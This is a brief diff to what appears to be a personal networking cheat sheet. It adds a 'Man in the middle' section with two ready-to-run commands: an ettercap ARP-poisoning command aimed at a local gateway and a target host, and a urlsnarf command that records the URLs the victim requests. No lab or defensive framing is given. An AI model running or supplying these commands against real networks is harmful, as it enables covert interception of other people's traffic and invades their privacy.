@@ -37,3 +37,11 @@ net-tools
 /sbin/slattach
 /usr/sbin/arp
 ```
+
+## Man in the middle
+
+```bash
+ettercap -M arp -p -T -q -i wlp58s0 /192.168.1.1// /192.168.1.9//
+
+urlsnarf -i wlp58s0 
+```
